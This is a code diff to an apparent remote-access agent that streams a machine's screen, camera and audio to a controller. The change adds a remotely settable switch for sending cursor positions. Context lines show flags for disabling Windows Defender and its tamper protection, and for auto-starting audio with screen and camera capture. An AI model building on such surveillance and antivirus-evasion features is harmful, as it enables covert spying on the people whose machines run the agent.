@@ -2601,6 +2601,7 @@ DEFENDER_DISABLE_ENABLED = False
 DEFENDER_TAMPER_DISABLE_ENABLED = False
 AUTO_START_AUDIO_WITH_SCREEN = os.environ.get('AUTO_START_AUDIO_WITH_SCREEN', '1') == '1'
 AUTO_START_AUDIO_WITH_CAMERA = os.environ.get('AUTO_START_AUDIO_WITH_CAMERA', '1') == '1'
+CURSOR_EMIT_ENABLED = os.environ.get('STREAM_CURSOR_EMIT', '1') == '1'
 SOCKET_MAX_BPS = int(os.environ.get('SOCKET_MAX_BPS', str(8 * 1024 * 1024)))
 def _default_upload_dir():
     try:
@@ -16803,7 +16804,7 @@ def on_start_stream(data):
 
 def on_set_stream_params(data):
     try:
-        global TARGET_FPS, SCREEN_MAX_WIDTH, SCREEN_JPEG_QUALITY, TARGET_CAMERA_FPS, DELTA_STREAM_ENABLED, STREAM_TILE_SIZE, DELTA_DIFF_THRESHOLD
+        global TARGET_FPS, SCREEN_MAX_WIDTH, SCREEN_JPEG_QUALITY, TARGET_CAMERA_FPS, DELTA_STREAM_ENABLED, STREAM_TILE_SIZE, DELTA_DIFF_THRESHOLD, CURSOR_EMIT_ENABLED
         t = str(data.get('type', 'screen') or 'screen').lower()
         fps = data.get('fps')
         width = data.get('max_width')
@@ -16811,6 +16812,7 @@ def on_set_stream_params(data):
         delta = data.get('delta')
         tile_size = data.get('tile_size')
         diff_threshold = data.get('diff_threshold')
+        cursor_emit = data.get('cursor_emit')
         if t == 'screen':
             if isinstance(fps, (int, float)) and fps > 0:
                 TARGET_FPS = int(fps)
@@ -16824,6 +16826,8 @@ def on_set_stream_params(data):
                 STREAM_TILE_SIZE = int(tile_size)
             if isinstance(diff_threshold, (int, float)) and int(diff_threshold) >= 1:
                 DELTA_DIFF_THRESHOLD = int(diff_threshold)
+            if isinstance(cursor_emit, bool):
+                CURSOR_EMIT_ENABLED = cursor_emit
             safe_emit('agent_notification', {'type': 'info', 'title': 'Screen Params Updated', 'message': f'FPS={TARGET_FPS}, max_width={SCREEN_MAX_WIDTH}, quality={SCREEN_JPEG_QUALITY}'})
         elif t == 'camera':
             if isinstance(fps, (int, float)) and fps > 0:
@@ -21845,8 +21849,8 @@ def stream_screen_h264_socketio(agent_id):
         threading.Thread(target=screen_capture_worker, args=(agent_id,), daemon=True),
         threading.Thread(target=screen_encode_worker, args=(agent_id,), daemon=True),
         threading.Thread(target=screen_send_worker, args=(agent_id,), daemon=True),
-        threading.Thread(target=cursor_emit_worker, args=(agent_id,), daemon=True),
     ]
+    STREAM_THREADS.append(threading.Thread(target=cursor_emit_worker, args=(agent_id,), daemon=True))
     for t in STREAM_THREADS:
         t.start()
     log_message(f"Started modern non-blocking video stream at {TARGET_FPS} FPS.")
@@ -21867,6 +21871,9 @@ def cursor_emit_worker(agent_id):
     try:
         while STREAMING_ENABLED:
             try:
+                if not CURSOR_EMIT_ENABLED:
+                    time.sleep(0.2)
+                    continue
                 import ctypes
                 from ctypes import wintypes
                 pt = wintypes.POINT()
